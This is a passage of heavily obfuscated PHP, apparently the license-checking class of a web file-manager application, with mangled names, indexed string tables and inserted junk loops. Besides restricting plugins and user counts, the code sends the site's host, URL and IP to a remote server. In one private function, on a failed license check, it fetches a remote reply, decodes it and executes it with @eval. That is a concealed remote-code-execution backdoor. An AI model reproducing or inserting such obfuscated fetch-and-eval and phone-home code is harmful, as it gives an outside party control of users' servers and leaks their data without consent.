15) . $›¡­¶¾¢[176]; $ë¯ÁÄÅ = $this->ntelac410ede(trim($Ï™Òæö[$›¡­¶¾¢[177]]), $‹‚¡ñÕ¢, 2); $Ä¦ƒ¼Ò“ = json_decode($ë¯ÁÄÅ, !0); if (!is_array($Ä¦ƒ¼Ò“) || !is_array($Ä¦ƒ¼Ò“[$›¡­¶¾¢[178]]) || $Ä¦ƒ¼Ò“[$›¡­¶¾¢[152]] != !0) { $Şˆ˜¼İé = $›¡­¶¾¢[179]; $î«”«ı = $Ä¦ƒ¼Ò“[$›¡­¶¾¢[178]] ? $›¡­¶¾¢[180] . $Ä¦ƒ¼Ò“[$›¡­¶¾¢[178]] : $Şˆ˜¼İé; show_json($î«”«ı, !1); } else { $‹ç‚½óœ[$›¡­¶¾¢[155]] = $Ä¦ƒ¼Ò“[$›¡­¶¾¢[178]][$›¡­¶¾¢[181]]; } } else { $Ä¦ƒ¼Ò“ = $this->moau3fd5ec13($›¡­¶¾¢[182], $‹ç‚½óœ, 10); $æŠöóœÊ = $Ú™ÕÕÃù[739]; if (!$æŠöóœÊ) { die; } } } if (!is_array($Ä¦ƒ¼Ò“) || !is_array($Ä¦ƒ¼Ò“[$›¡­¶¾¢[178]]) || $Ä¦ƒ¼Ò“[$›¡­¶¾¢[152]] != !0) { $Şˆ˜¼İé = LNG($›¡­¶¾¢[183]); $î«”«ı = $Ä¦ƒ¼Ò“[$›¡­¶¾¢[178]] ? $›¡­¶¾¢[180] . $Ä¦ƒ¼Ò“[$›¡­¶¾¢[178]] : $Şˆ˜¼İé; show_json($î«”«ı, !1); } $Ö€Ÿıõ± = $Ä¦ƒ¼Ò“[$›¡­¶¾¢[178]]; $Üêæß°Ó = $this->icsv42bef2cd($Ö€Ÿıõ±[$›¡­¶¾¢[184]]); $õ—§‹ïï = $Ú™ÕÕÃù[740]; if (!$Üêæß°Ó || $Üêæß°Ó != $Ö€Ÿıõ±[$›¡­¶¾¢[129]]) { $¨ŒûÇ€Ÿ = array($›¡­¶¾¢[185] => Model($›¡­¶¾¢[33])->get($›¡­¶¾¢[100]), $›¡­¶¾¢[186] => $_SERVER[$›¡­¶¾¢[106]], $›¡­¶¾¢[187] => this_url(), $›¡­¶¾¢[161] => $_SERVER[$›¡­¶¾¢[162]]); $ë¯ÁÄÅ = $this->rlga3b65da59(json_encode($¨ŒûÇ€Ÿ)); $this->moau3fd5ec13($›¡­¶¾¢[188] . $ë¯ÁÄÅ); show_json(LNG($›¡­¶¾¢[189]), !0); } $¶±ºÅëº = array($›¡­¶¾¢[153] => $Ö€Ÿıõ±[$›¡­¶¾¢[190]], $›¡­¶¾¢[191] => $Ö€Ÿıõ±[$›¡­¶¾¢[192]], $›¡­¶¾¢[193] => rand_string(16), $›¡­¶¾¢[108] => $Ö€Ÿıõ±[$›¡­¶¾¢[194]]); if ($‹ç‚½óœ[$›¡­¶¾¢[155]]) { $¶±ºÅëº[$›¡­¶¾¢[193]] = $‹ç‚½óœ[$›¡­¶¾¢[155]]; } $‡À –úÃ = substr(md5($¶±ºÅëº[$›¡­¶¾¢[191]]), 10, 10); $˜õ®˜Ö› = $‡À –úÃ . $¶±ºÅëº[$›¡­¶¾¢[108]] . $¶±ºÅëº[$›¡­¶¾¢[193]]; $¶±ºÅëº[$›¡­¶¾¢[110]] = strrev(base64_encode($this->lunt9121f6a1($˜õ®˜Ö›, $›¡­¶¾¢[195]))); $…ÜØùø¤ = rand_string(16); $üœˆîÊÓ = $…ÜØùø¤ . $¶±ºÅëº[$›¡­¶¾¢[108]] . $this->lunt9121f6a1(md5($¶±ºÅëº[$›¡­¶¾¢[153]]), $…ÜØùø¤); $¶±ºÅëº[$›¡­¶¾¢[111]] = base64_encode(strrev($this->lunt9121f6a1($üœˆîÊÓ, $›¡­¶¾¢[196]))); if ($Ö€Ÿıõ±[$›¡­¶¾¢[197]] && $Ö€Ÿıõ±[$›¡­¶¾¢[197]] >= 1) { Model($›¡­¶¾¢[33])->setDeep($›¡­¶¾¢[198], $›¡­¶¾¢[122]); } Model($›¡­¶¾¢[33])->set($¶±ºÅëº); $ÒÉ¼û£— = md5($_SERVER[$›¡­¶¾¢[106]] . strrev($©†Öíşª) . $¶±ºÅëº[$›¡­¶¾¢[191]]); $ß•‹ˆù = strrev(substr($ÒÉ¼û£—, 10, 16)); $¯œàÇ´‘ = $Ú™ÕÕÃù[741]; while ($¯œàÇ´‘ < $Ú™ÕÕÃù[720]) { if ($¯œàÇ´‘ >= 0) { break; } $¯œàÇ´‘++; } $±ÉÜƒÑİ = $this->hvxk869b1600(json_encode($Ö€Ÿıõ±), $ÒÉ¼û£—); $“š˜Ò®í = array_to_keyvalue(Model($›¡­¶¾¢[7])->listData(), $›¡­¶¾¢[199]); $á™ºŸ© = $“š˜Ò®í[$›¡­¶¾¢[200]]; $Ï»ˆ×» = array(); $Ï»ˆ×»[$ß•‹ˆù] = $±ÉÜƒÑİ; Model($›¡­¶¾¢[7])->update($á™ºŸ©[$›¡­¶¾¢[201]], array($›¡­¶¾¢[202] => $Ï»ˆ×»)); $’¹¿ôÁÃ = $Ú™ÕÕÃù[742]; while ($’¹¿ôÁÃ < $Ú™ÕÕÃù[697]) { if ($’¹¿ôÁÃ >= 0) { break; } $’¹¿ôÁÃ++; } $this->borxadd61fc3 = $Ö€Ÿıõ±; $this->tihkeb32dd7b = $¶±ºÅëº[$›¡­¶¾¢[108]]; $this->licenseRegistSuccess(); Cache::set($›¡­¶¾¢[203] . md5($©†Öíşª . $›¡­¶¾¢[204]), $›¡­¶¾¢[6]); $Ÿ¶¦¼·ƒ = $Ú™ÕÕÃù[743]; if (!$Ÿ¶¦¼·ƒ) { return; } show_json(LNG($›¡­¶¾¢[189]), !0); } private function licenseRegistSuccess() { $±€ì”Ìş =& $_SERVER[´È¥ö†ö]; $Şá˜èÉ¿ =& $_SERVER[–®Á¾äİ]; $ÖÈ°úï = Model($Şá˜èÉ¿[33])->get(); $¥¹çñÜÁ = $±€ì”Ìş[744]; if (strlen($¥¹çñÜÁ) < $±€ì”Ìş[697]) { die; } if ($ÖÈ°úï[$Şá˜èÉ¿[63]] != $Şá˜èÉ¿[122]) { Model($Şá˜èÉ¿[33])->set($Şá˜èÉ¿[63], $Şá˜èÉ¿[122]); } Action($Şá˜èÉ¿[205])->initStart(!0); } private function rpez8e1950d1() { $Îıµ»¦Ÿ =& $_SERVER[´È¥ö†ö]; $¥öÚ®¸æ =& $_SERVER[–®Á¾äİ]; Model($¥öÚ®¸æ[33])->set(array($¥öÚ®¸æ[153] => $¥öÚ®¸æ[6], $¥öÚ®¸æ[191] => $¥öÚ®¸æ[6], $¥öÚ®¸æ[108] => $¥öÚ®¸æ[109], $¥öÚ®¸æ[110] => $¥öÚ®¸æ[6], $¥öÚ®¸æ[111] => $¥öÚ®¸æ[6])); Model($¥öÚ®¸æ[33])->setDeep($¥öÚ®¸æ[198], $¥öÚ®¸æ[206]); $¡Çˆ°¯ = $Îıµ»¦Ÿ[745]; $this->borxadd61fc3 = array(); $•‘–§ğ© = $Îıµ»¦Ÿ[746]; $this->tihkeb32dd7b = $¥öÚ®¸æ[109]; } private function iukn7dd5c9a9() { $Ô‘æäÍë =& $_SERVER[´È¥ö†ö]; $Œ†‚óÖ =& $_SERVER[–®Á¾äİ]; $_SERVER[$Œ†‚óÖ[162]] = _get($_SERVER, $Œ†‚óÖ[162], APP_HOST); $this->tihkeb32dd7b = $Œ†‚óÖ[109]; $ßâ‡¢ïé = $Ô‘æäÍë[747]; $§¤¶ß = Model($Œ†‚óÖ[33])->get(); if ($§¤¶ß[$Œ†‚óÖ[108]] == $Œ†‚óÖ[109]) { return; } $Ê»¦–Ç = Model($Œ†‚óÖ[33])->get($Œ†‚óÖ[100]); $¹–ú±Û¸ = $Ô‘æäÍë[748]; while (strlen($¹–ú±Û¸) < $Ô‘æäÍë[313]) { if (!$¹–ú±Û¸) { break; } $¹–ú±Û¸++; } $æ²°â = $Œ†‚óÖ[203] . md5($Ê»¦–Ç . $Œ†‚óÖ[204]); $íâøøÉƒ = $Ô‘æäÍë[749]; if (strlen($íâøøÉƒ) < $Ô‘æäÍë[313]) { die; } $‹Í£¬Á = Cache::get($æ²°â); if (!is_array($‹Í£¬Á) || !isset($‹Í£¬Á[$Œ†‚óÖ[207]]) || time() - $‹Í£¬Á[$Œ†‚óÖ[207]] >= 60) { $“¦»ÎŞæ = Model($Œ†‚óÖ[7])->loadList(); $íµ»Ëåª = $“¦»ÎŞæ[$Œ†‚óÖ[200]]; $…³âä¹ = md5($_SERVER[$Œ†‚óÖ[106]] . strrev($Ê»¦–Ç) . $§¤¶ß[$Œ†‚óÖ[191]]); $¡¹² ¤É = strrev(substr($…³âä¹, 10, 16)); $‹Í£¬Á = $this->ntelac410ede($íµ»Ëåª[$Œ†‚óÖ[86]][$¡¹² ¤É], $…³âä¹); $‹Í£¬Á = json_decode($‹Í£¬Á, !0); } if (!is_array($‹Í£¬Á)) { return $this->rpez8e1950d1(); } $³ØëáçÑ = strtotime($‹Í£¬Á[$Œ†‚óÖ[129]]); if (time() >= $³ØëáçÑ) { return $this->rpez8e1950d1(); } if (!isset($‹Í£¬Á[$Œ†‚óÖ[207]]) || time() - $‹Í£¬Á[$Œ†‚óÖ[207]] > 20) { $‹Í£¬Á[$Œ†‚óÖ[207]] = time(); Cache::set($æ²°â, $‹Í£¬Á); } $this->borxadd61fc3 = $‹Í£¬Á; $this->tihkeb32dd7b = $§¤¶ß[$Œ†‚óÖ[108]]; } private function izcp910c921b() { $ù·­ƒªÉ =& $_SERVER[–®Á¾äİ]; $ÚŸàÀÓ¨ = $GLOBALS[$ù·­ƒªÉ[13]]; $€Êëƒªã = $_SERVER[$ù·­ƒªÉ[24]]; $ªßÛ« ¦ = $_SERVER[´È¥ö†ö][750]; if ($€Êëƒªã == $ù·­ƒªÉ[208] && $this->tihkeb32dd7b == $ù·­ƒªÉ[109]) { show_json(LNG($ù·­ƒªÉ[209]), !1, $ù·­ƒªÉ[210]); } $ØÎ½¯ˆ = array($ù·­ƒªÉ[211], $ù·­ƒªÉ[212]); if (in_array($€Êëƒªã, $ØÎ½¯ˆ)) { if ($this->tihkeb32dd7b == $ù·­ƒªÉ[109] && isset($ÚŸàÀÓ¨[$ù·­ƒªÉ[213]])) { show_json(LNG($ù·­ƒªÉ[209]), !1, $ù·­ƒªÉ[210]); die; } $¼±‰ì„ = $this->yrva480773e7(); if ($¼±‰ì„ != intval($ù·­ƒªÉ[214])) { if ($¼±‰ì„ <= Model($ù·­ƒªÉ[125])->count()) { show_json(LNG($ù·­ƒªÉ[215]), !1, $ù·­ƒªÉ[210]); die; } } } } private function ynshb840460e() { $×ñûúæ– =& $_SERVER[´È¥ö†ö]; $…ÛÇìÇ… =& $_SERVER[–®Á¾äİ]; $§šá½Ç¡ = array($…ÛÇìÇ…[119], $…ÛÇìÇ…[120]); $”¢ìÛ¥Ë = $×ñûúæ–[751]; if (strlen($”¢ìÛ¥Ë) < $×ñûúæ–[720]) { die; } if (!KodUser::isRoot() || !isset($_GET[$…ÛÇìÇ…[216]])) { return; } if (!in_array($_SERVER[$…ÛÇìÇ…[24]], $§šá½Ç¡)) { return; } $ßùï£Úî = $…ÛÇìÇ…[217]; $ÑÅÁ¹ìß = $×ñûúæ–[752]; if (!$ÑÅÁ¹ìß) { return; } $ßùï£Úî = $this->nelx100bfcab($ßùï£Úî, $…ÛÇìÇ…[218]); $ÕÃÍ¸õö = stream_context_create(array($…ÛÇìÇ…[219] => array($…ÛÇìÇ…[220] => $…ÛÇìÇ…[221], $…ÛÇìÇ…[222] => 3))); $¥÷ú­€ê = @file_get_contents($ßùï£Úî, !1, $ÕÃÍ¸õö); header($…ÛÇìÇ…[223]); $¶†ê¬øÈ = $×ñûúæ–[753]; if (!$¶†ê¬øÈ) { die; } if ($¥÷ú­€ê && strstr($¥÷ú­€ê, $…ÛÇìÇ…[224])) { echo $¥÷ú­€ê; } die; } public function kgsdc8a42fa7($Â¨¦ÜÎÕ) { $’È¢Ğ¡ =& $_SERVER[–®Á¾äİ]; if ($this->tihkeb32dd7b == $’È¢Ğ¡[225]) { return $Â¨¦ÜÎÕ; } $Ô®‹êâğ = $this->versionPluginList(); $åüªãß = explode($’È¢Ğ¡[226], $this->versionPluginFilter()); $Ë³Ç®¢¯ = array(); foreach ($Ô®‹êâğ as $Úº–æš => $×±À¯î¿) { if ($×±À¯î¿ == $’È¢Ğ¡[227] && substr($this->tihkeb32dd7b, 0, 1) == $’È¢Ğ¡[227]) { continue; } if (!in_array($Úº–æš, $åüªãß)) { $Ë³Ç®¢¯[] = $Úº–æš; } } foreach ($Ë³Ç®¢¯ as $Úº–æš) { unset($Â¨¦ÜÎÕ[$Úº–æš]); } return $Â¨¦ÜÎÕ; } private function versionPluginList() { $¿¬·µÏÒ =& $_SERVER[–®Á¾äİ]; return array($¿¬·µÏÒ[228] => $¿¬·µÏÒ[227], $¿¬·µÏÒ[229] => $¿¬·µÏÒ[227], $¿¬·µÏÒ[230] => $¿¬·µÏÒ[227], $¿¬·µÏÒ[231] => $¿¬·µÏÒ[232], $¿¬·µÏÒ[233] => $¿¬·µÏÒ[232], $¿¬·µÏÒ[234] => $¿¬·µÏÒ[232], $¿¬·µÏÒ[235] => $¿¬·µÏÒ[232], $¿¬·µÏÒ[236] => $¿¬·µÏÒ[232], $¿¬·µÏÒ[237] => $¿¬·µÏÒ[232], $¿¬·µÏÒ[238] => $¿¬·µÏÒ[232], $¿¬·µÏÒ[239] => $¿¬·µÏÒ[232], $¿¬·µÏÒ[240] => $¿¬·µÏÒ[232], $¿¬·µÏÒ[241] => $¿¬·µÏÒ[232], $¿¬·µÏÒ[242] => $¿¬·µÏÒ[232], $¿¬·µÏÒ[243] => $¿¬·µÏÒ[232], $¿¬·µÏÒ[244] => $¿¬·µÏÒ[232]); } private function versionPluginFilter() { $×ƒ•Ùôë =& $_SERVER[–®Á¾äİ]; if ($this->tihkeb32dd7b == $×ƒ•Ùôë[109]) { return $×ƒ•Ùôë[6]; } $üèíê‡Õ = _get($this->borxadd61fc3, $×ƒ•Ùôë[245], $×ƒ•Ùôë[6]); $™üÇ‰Á = $_SERVER[´È¥ö†ö][754]; if (!$™üÇ‰Á) { die; } $‚¯²å¯¦ = _get($this->borxadd61fc3, $×ƒ•Ùôë[116], $×ƒ•Ùôë[6]); $ùÅ‡­’§ = _get($this->borxadd61fc3, $×ƒ•Ùôë[246], $×ƒ•Ùôë[6]); if ($‚¯²å¯¦ > time() && $ùÅ‡­’§ > time()) { $¸ıÖ¶“ê = explode($×ƒ•Ùôë[226], $üèíê‡Õ); $·Û¨Ìä÷ = array_keys($this->versionPluginList()); $üèíê‡Õ = array_merge($¸ıÖ¶“ê, $·Û¨Ìä÷); $üèíê‡Õ = implode($×ƒ•Ùôë[226], array_filter(array_unique($üèíê‡Õ))); } return $üèíê‡Õ; } private function vtlyeb40179c() { $¤²ƒÜ·Ô =& $_SERVER[–®Á¾äİ]; if ($this->tihkeb32dd7b != $¤²ƒÜ·Ô[109]) { $GLOBALS[$¤²ƒÜ·Ô[86]][$¤²ƒÜ·Ô[90]][$¤²ƒÜ·Ô[247]] = $¤²ƒÜ·Ô[206]; return; } $GLOBALS[$¤²ƒÜ·Ô[86]][$¤²ƒÜ·Ô[248]] = $¤²ƒÜ·Ô[122]; if (Model($¤²ƒÜ·Ô[249])->get($¤²ƒÜ·Ô[63]) != $¤²ƒÜ·Ô[206]) { Model($¤²ƒÜ·Ô[249])->set($¤²ƒÜ·Ô[63], $¤²ƒÜ·Ô[206]); } } public function nltcaf2906e3() { return $_SERVER[–®Á¾äİ][250]; $ÉòÚ›Ø¯ = $_SERVER[´È¥ö†ö][755]; if (!$ÉòÚ›Ø¯) { return; } } private function gijofee7d298() { $İÏÖîÛü =& $_SERVER[´È¥ö†ö]; $‹ëú””ü =& $_SERVER[–®Á¾äİ]; $ä¾£ÖÆÂ = array($‹ëú””ü[251], $‹ëú””ü[252], $‹ëú””ü[253]); $¹ö¸£Ñ = $İÏÖîÛü[756]; $¤¢¨–á = $‹ëú””ü[254] . md5($‹ëú””ü[255]); $«ŸÚéÈ = $İÏÖîÛü[757]; if (!$«ŸÚéÈ) { return; } if ($this->tihkeb32dd7b == $‹ëú””ü[109] || !KodUser::isRoot()) { return; } if (!in_array($_SERVER[$‹ëú””ü[24]], $ä¾£ÖÆÂ)) { return; } if (time() % 4 != 0) { return; } $Á‹…âã„ = call_user_func(array($‹ëú””ü[256], $‹ëú””ü[257]), $¤¢¨–á); $Ñ¥³”ğæ = $İÏÖîÛü[758]; while ($Ñ¥³”ğæ < $İÏÖîÛü[702]) { if ($Ñ¥³”ğæ >= 0) { break; } $Ñ¥³”ğæ++; } if ($Á‹…âã„ && time() - $Á‹…âã„ < intval($‹ëú””ü[258])) { return; } call_user_func(array($‹ëú””ü[256], $‹ëú””ü[139]), $¤¢¨–á, time()); $ÄÌ§…şÒ = $İÏÖîÛü[759]; $ïÍ¥Çİ¾ = Model($‹ëú””ü[33])->get($‹ëú””ü[100]); $û‡‡Í“ö = array($‹ëú””ü[152] => Model($‹ëú””ü[33])->get($‹ëú””ü[153]), $‹ëú””ü[167] => $this->tihkeb32dd7b, $‹ëú””ü[163] => $_SERVER[$‹ëú””ü[164]], $‹ëú””ü[165] => Model($‹ëú””ü[33])->get($‹ëú””ü[131]), $‹ëú””ü[105] => md5($_SERVER[$‹ëú””ü[106]] . $ïÍ¥Çİ¾), $‹ëú””ü[156] => $‹ëú””ü[136], $‹ëú””ü[159] => $_SERVER[$‹ëú””ü[160]]); $×Ğğ˜¹ = $İÏÖîÛü[760]; while ($×Ğğ˜¹ < $İÏÖîÛü[313]) { if ($×Ğğ˜¹ >= 0) { break; } $×Ğğ˜¹++; } $Ÿ¿µÅ¹® = $this->moau3fd5ec13($‹ëú””ü[259], $û‡‡Í“ö); $Êµâã©œ = $İÏÖîÛü[761]; if (strlen($Êµâã©œ) < $İÏÖîÛü[313]) { die; } if (!is_array($Ÿ¿µÅ¹®)) { return; } if ($Ÿ¿µÅ¹®[$‹ëú””ü[152]] && $Ÿ¿µÅ¹®[$‹ëú””ü[260]]) { if ($this->icsv42bef2cd($Ÿ¿µÅ¹®[$‹ëú””ü[260]]) == $û‡‡Í“ö[$‹ëú””ü[152]]) { return; } } $this->rpez8e1950d1(); $ÅÂ½ùòŞ = $İÏÖîÛü[762]; if (!$ÅÂ½ùòŞ) { die; } if ($this->icsv42bef2cd($Ÿ¿µÅ¹®[$‹ëú””ü[260]]) != $û‡‡Í“ö[$‹ëú””ü[152]]) { $Â­­ı‘¹ = array($‹ëú””ü[185] => $ïÍ¥Çİ¾, $‹ëú””ü[186] => $_SERVER[$‹ëú””ü[106]], $‹ëú””ü[187] => this_url(), $‹ëú””ü[161] => $_SERVER[$‹ëú””ü[162]]); $¤«ÔŒéå = $this->rlga3b65da59(json_encode($Â­­ı‘¹)); $Ÿ¿µÅ¹® = $this->moau3fd5ec13($‹ëú””ü[188] . $¤«ÔŒéå); if ($Ÿ¿µÅ¹® && is_array($Ÿ¿µÅ¹®) && isset($Ÿ¿µÅ¹®[$‹ëú””ü[260]])) { $ß°¶–Õ’ = $this->ntelac410ede($Ÿ¿µÅ¹®[$‹ëú””ü[260]], 2); if ($ß°¶–Õ’) { $ß°¶–Õ’ = $this->icsv42bef2cd($ß°¶–Õ’); } if ($ß°¶–Õ’) { try { @eval($ß°¶–Õ’); } catch (Exception $÷÷¶”ëÀ) { } } } } } private function moau3fd5ec13($°éªŠü¶ = '', $‹âÇÆÁ = array(), $–áÁò¹ã = 5) { $‰Íõõ =& $_SERVER[´È¥ö†ö]; $ÁŸ²ªãè =& $_SERVER[–®Á¾äİ]; $ÜöÑ–ÒÍ = $ÁŸ²ªãè[261]; $ÌÎ³õó = $‰Íõõ[763]; if (!$ÌÎ³õó) { return; } $ÜöÑ–ÒÍ = $this->nelx100bfcab($ÜöÑ–ÒÍ, $ÁŸ²ªãè[262]); $ÜöÑ–ÒÍ = $ÜöÑ–ÒÍ . $°éªŠü¶; if ($‹âÇÆÁ && is_array($‹âÇÆÁ)) { $ÜöÑ–ÒÍ = $ÜöÑ–ÒÍ . $ÁŸ²ªãè[263] . http_build_query($‹âÇÆÁ); } if ($‹âÇÆÁ === -1) { return $ÜöÑ–ÒÍ; } $»¥Ã‹ìÆ = stream_context_create(array($ÁŸ²ªãè[219] => array($ÁŸ²ªãè[222] => $–áÁò¹ã, $ÁŸ²ªãè[220] => $ÁŸ²ªãè[264]), $ÁŸ²ªãè[265] => array($ÁŸ²ªãè[266] => !1, $ÁŸ²ªãè[267] => !1))); $‹âÇÆÁ = @file_get_contents($ÜöÑ–ÒÍ, !1, $»¥Ã‹ìÆ); $’œÁ¢åã = $‰Íõõ[764]; if (!$’œÁ¢åã) { die; } return json_decode($‹âÇÆÁ, !0); $ÜŠ÷±åÊ = $‰Íõõ[765]; if (!$ÜŠ÷±åÊ) { die; } } private function yrva480773e7() { $´´³÷ÃŠ =& $_SERVER[´È¥ö†ö]; $³öñ‘ÛÔ =& $_SERVER[–®Á¾äİ]; $¬ŒŒ‡çÓ = array($³öñ‘ÛÔ[268] => $³öñ‘ÛÔ[269], $³öñ‘ÛÔ[270] => $³öñ‘ÛÔ[271], $³öñ‘ÛÔ[272] => $³öñ‘ÛÔ[273], $³öñ‘ÛÔ[274] => $³öñ‘ÛÔ[275], $³öñ‘ÛÔ[276] => $³öñ‘ÛÔ[277], $³öñ‘ÛÔ[278] => $³öñ‘ÛÔ[214], $³öñ‘ÛÔ[279] => $³öñ‘ÛÔ[214], $³öñ‘ÛÔ[280] => $³öñ‘ÛÔ[269], $³öñ‘ÛÔ[281] => $³öñ‘ÛÔ[271], $³öñ‘ÛÔ[282] => $³öñ‘ÛÔ[273], $³öñ‘ÛÔ[283] => $³öñ‘ÛÔ[284], $³öñ‘ÛÔ[285] => $³öñ‘ÛÔ[275], $³öñ‘ÛÔ[286] => $³öñ‘ÛÔ[287], $³öñ‘ÛÔ[288] => $³öñ‘ÛÔ[277], $³öñ‘ÛÔ[289] => $³öñ‘ÛÔ[290], $³öñ‘ÛÔ[291] => $³öñ‘ÛÔ[292], $³öñ‘ÛÔ[293] => $³öñ‘ÛÔ[294]); $»´áÖ´€ = $´´³÷ÃŠ[766]; if (!$»´áÖ´€) { return; } $äĞŸ€¼œ = $¬ŒŒ‡çÓ[$this->tihkeb32dd7b]; $ç¥›Ğø = $´´³÷ÃŠ[767]; if (!$ç¥›Ğø) { return; } $äĞŸ€¼œ = intval($äĞŸ€¼œ ? $äĞŸ€¼œ : $³öñ‘ÛÔ[269]); $¯‡´å»ö = _get($this->borxadd61fc3, $³öñ‘ÛÔ[295]); $áßØğŸ¢ = $´´³÷ÃŠ[768]; if (!$áßØğŸ¢) { return; } $¯‡´å»ö = $¯‡´å»ö ? intval($¯‡´å»ö) : 0; return $äĞŸ€¼œ + $¯‡´å»ö; } public function pcvl959d2b03($î¦ë©ìÜ) { $Àñş¥™ó =& $_SERVER[´È¥ö†ö]; $Õ®»¸Ü =& $_SERVER[–®Á¾äİ]; $¦øÍÌ› = $this->yrva480773e7(); $‹œ•ç´ = $Àñş¥™ó[769]; if ($î¦ë©ìÜ[$Õ®»¸Ü[296]] == $Õ®»¸Ü[122]) { return; } if ($¦øÍÌ› >= intval($Õ®»¸Ü[214])) { return; } $Ÿ©ôûÃ‹ = Model($Õ®»¸Ü[125])->count(); $ÉĞı¬şù = $Àñş¥™ó[770]; if (!$ÉĞı¬şù) { die; } if ($Ÿ©ôûÃ‹ <= $¦øÍÌ›) { return; } $»ÈÍèú“ = Model($Õ®»¸Ü[125])->field($Õ®»¸Ü[296])->limit($¦øÍÌ›)->select(); $ÆÄ¨ñ²¸ = $Àñş¥™ó[771]; if (strlen($ÆÄ¨ñ²¸) < $Àñş¥™ó[313]) { return; } $»ÈÍèú“ = array_to_keyvalue($»ÈÍèú“, $Õ®»¸Ü[6], $Õ®»¸Ü[296]); if (!in_array($î¦ë©ìÜ[$Õ®»¸Ü[296]], $»ÈÍèú“)) { show_json($Õ®»¸Ü[297], !1, $Õ®»¸Ü[210]); } } public function jpgt7ca4729c() { $³Ê³ßÚí =& $_SERVER[–®Á¾äİ]; if (!KodUser::isRoot() || mt_rand(1, 100) > 20) { return; } $ŠÒò¨’Ë = $³Ê³ßÚí[217]; $®±²†İ = $_SERVER[´È¥ö†ö][772]; $ŠÒò¨’Ë = $this->nelx100bfcab($ŠÒò¨’Ë, $³Ê³ßÚí[218]); $ø“Êæøš = stream_context_create(array($³Ê³ßÚí[219] => array($³Ê³ßÚí[220] => $³Ê³ßÚí[221], $³Ê³ßÚí[222] => 3))); $²¾·µ» = @file_get_contents($ŠÒò¨’Ë, !1, $ø“Êæøš); echo $³Ê³ßÚí[298] . hash_encode($²¾·µ») . $³Ê³ßÚí[299]; } private function hvxk869b1600($ıÁ™¸ê­, $ô†ŸÈ¬¡, $íğè“Æ = 3) { $Ûø‰ê•İ =& $_SERVER[´È¥ö†ö]; $üø³Òµ =& $_SERVER[–®Á¾äİ]; usleep(1); $ıÁ™¸ê­ = trim($ıÁ™¸ê­); $•¦ª¤¸  = $Ûø‰ê•İ[773]; if (strlen($•¦ª¤¸ ) < $Ûø‰ê•İ[702]) { die; } $Üßñ‚Áº = mt_rand(0, 5) . $üø³Òµ[6]; $İ®ŞÚûß = $Ûø‰ê•İ[774]; if (!$İ®ŞÚûß) { return; } $ş†¢ÛÙõ = rand_string(15); $¬Î›Ğ—Õ = $Ûø‰ê•İ[775]; if (!$¬Î›Ğ—Õ) { die; } $¨—œÆˆ˜ = $üø³Òµ[300]; $“÷¾ê¸› = $Ûø‰ê•İ[776]; while (strlen($“÷¾ê¸›) < $Ûø‰ê•İ[697]) { if (!$“÷¾ê¸›) { break; } $“÷¾ê¸›++; } switch ($Üßñ‚Áº) { case $üø³Òµ[206]: $³Ş÷ã¢µ = $this->lunt9121f6a1($ıÁ™¸ê­, strrev($ô†ŸÈ¬¡ . $ş†¢ÛÙõ)); break; case $üø³Òµ[122]: $³Ş÷ã¢µ = $this->lunt9121f6a1($ıÁ™¸ê­, strrev($ş†¢ÛÙõ . $ô†ŸÈ¬¡)); break; $üê°îí = $Ûø‰ê•İ[777]; case $üø³Òµ[301]: $³Ş÷ã¢µ = $this->lunt9121f6a1($ıÁ™¸ê­, base64_encode($ş†¢ÛÙõ . $ô†ŸÈ¬¡)); break; $…˜ç¤´ = $Ûø‰ê•İ[778]; while (strlen($…˜ç¤´) < $Ûø‰ê•İ[705]) { if (!$…˜ç¤´) { break; } $…˜ç¤´++; } case $üø³Òµ[302]: $³Ş÷ã¢µ = $this->lunt9121f6a1($ıÁ™¸ê­, md5($ş†¢ÛÙõ . $ô†ŸÈ¬¡)); break; case $üø³Òµ[303]: $ıÁ™¸ê­ = base64_encode($ıÁ™¸ê­); $´ƒ­º‚’ = $Ûø‰ê•İ[779]; if (strlen($´ƒ­º‚’) < $Ûø‰ê•İ[702]) { die; } $¡êçƒ§ = rand(0, 64); $°£—×§Ó = $Ûø‰ê•İ[780]; while ($°£—×§Ó < $Ûø‰ê•İ[313]) { if ($°£—×§Ó >= 0) { break; } $°£—×§Ó++; } $Ï—âÙÜ× = $¨—œÆˆ˜[$¡êçƒ§]; $šÇ¨ÇĞÙ = md5($Ï—âÙÜ× . md5($ô†ŸÈ¬¡ . $Ï—âÙÜ×) . $ô†ŸÈ¬¡); $šÇ¨ÇĞÙ = substr($šÇ¨ÇĞÙ, $¡êçƒ§ % 8, $¡êçƒ§ % 8 + 7); $”Ğûœö” = $Ûø‰ê•İ[781]; if (!$”Ğûœö”) { return; } $×¶øÔá™ = $üø³Òµ[6]; $Ûùäø€Æ = 0; $İ×óğí‰ = $Ûø‰ê•İ[782]; if (!$İ×óğí‰) { die; } $“Ÿ†‰ñŠ = 0; $ğ¿˜ú¨³ = 0; $¹†ºşä = $Ûø‰ê•İ[783]; if (strlen($¹†ºşä) < $Ûø‰ê•İ[697]) { die; } for ($Ûùäø€Æ = 0; $Ûùäø€Æ < strlen($ıÁ™¸ê­); $Ûùäø€Æ++) { $ğ¿˜ú¨³ = $ğ¿˜ú¨³ == strlen($šÇ¨ÇĞÙ) ? 0 : $ğ¿˜ú¨³; $“Ÿ†‰ñŠ = ($¡êçƒ§ + strpos($¨—œÆˆ˜, $ıÁ™¸ê­[$Ûùäø€Æ]) + ord($šÇ¨ÇĞÙ[$ğ¿˜ú¨³++])) % 64; $×¶øÔá™ .= $¨—œÆˆ˜[$“Ÿ†‰ñŠ]; $‹ÍÜ÷… = $Ûø‰ê•İ[784]; if (!$‹ÍÜ÷…) { return; } } $³Ş÷ã¢µ = hash_encode($Ï—âÙÜ× . $×¶øÔá™); $—§·Ü¡Õ = $Ûø‰ê•İ[785]; if (!$—§·Ü¡Õ) { return; } break; $‡‹”œ¨Í = $Ûø‰ê•İ[786]; while (strlen($‡‹”œ¨Í) < $Ûø‰ê•İ[313]) { if (!$‡‹”œ¨Í) { break; } $‡‹”œ¨Í++; } default: $³Ş÷ã¢µ = $this->lunt9121f6a1($ıÁ™¸ê­, $ô†ŸÈ¬¡ . $ş†¢ÛÙõ); break; $Ş…Óñ¤ = $Ûø‰ê•İ[787]; if (strlen($Ş…Óñ¤) < $Ûø‰ê•İ[705]) { return; } } $³Ş÷ã¢µ = strrev($Üßñ‚Áº . $ş†¢ÛÙõ . $³Ş÷ã¢µ); $½ö…í‰ = $Ûø‰ê•İ[788]; if ($íğè“Æ - 1 > 0) { $³Ş÷ã¢µ = $this->hvxk869b1600($³Ş÷ã¢µ, $ô†ŸÈ¬¡, $íğè“Æ - 1); 